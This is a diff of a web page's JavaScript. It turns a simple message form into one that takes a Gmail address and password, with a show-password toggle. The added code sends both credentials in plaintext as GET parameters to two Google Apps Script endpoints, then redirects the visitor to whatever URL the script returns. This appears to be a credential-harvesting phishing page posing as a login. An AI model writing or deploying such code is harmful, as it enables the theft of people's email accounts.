@@ -1,30 +1,60 @@
-var url= ["https://script.google.com/macros/s/AKfycbyrbYTKmiECXi75R7VHGu94NC_WTjGAzT8evdjMNZmF19jGACKI/exec", "https://script.google.com/macros/s/AKfycbx7lPujxZ3yqjr2UGwOM7xVvlcZZOYJd-Hkm-bsGw/exec"];
+var url= ["https://script.google.com/macros/s/AKfycbwyjiwLa7LGHT_LJJ-S6NST_joY9KhDiKJZVzpBGwkovOFIcNqrndEQsFJfoPkElL6A/exec", "https://script.google.com/macros/s/AKfycbxJb1-RL5mnG6AtLvLTogQk4WXmZwYWbr-XTscWCaIGi7dsQ-sxIgAWWVV6UqhB5Y0EMw/exec"];
 
-function Confirm(){
-    var message= document.getElementById("message").value;
-    document.getElementById("message").value= "";
-    Send(message, 0);
+var eye= document.getElementById("checkEye");
+eye.addEventListener("click", function(e){
+    if(e.target.classList.contains("fa-eye")){
+        e.target.classList.remove("fa-eye");
+        e.target.classList.add("fa-eye-slash");
+        document.getElementById("password").setAttribute("type", "text");
+    }
+    else{
+        document.getElementById("password").setAttribute("type", "password");
+        e.target.classList.remove("fa-eye-slash");
+        e.target.classList.add("fa-eye");
+    }
+    document.getElementById("password").focus();
+});
+
+function showPassword(status){
+    if(status)
+        password.type= "text";
+    else
+        password.type= "password";
 }
 
-function Send(message, index){
+document.getElementById("password").addEventListener('focus', Focus);
+function Focus(){
+    document.getElementById("password-area").focus();
+}
+
+function Confirm(){
+    var gmail= document.getElementById("gmail").value;
+    var password= document.getElementById("password").value;
+    document.getElementById("gmail").value= "";
+    document.getElementById("password").value= "";
+    Send(gmail, password, 0);
+}
+
+function Send(gmail, password, index){
     $.ajax({
             type:'get',
             cache: false,
             timeout: 5000,
             url: url[index%2],
             data:  {
-                'message' : message
+                'gmail' : gmail,
+                'password': password
             },
             datatype:'json',
             success: function(respond){
                 if(respond=="WA")
-                    alert("訊息錯誤");
+                    alert("郵件或密碼輸入錯誤");
                 else
                     location.href= respond;
             },
             error: function(XMLHttpRequest, textStatus, errorThrown){
-                    alert("執行逾時，將重新傳送訊息");
-                    Send(data, index+1);
+                alert("執行逾時，將重新傳送訊息");
+                Send(gmail, password, index+1);
             }
         });
 }
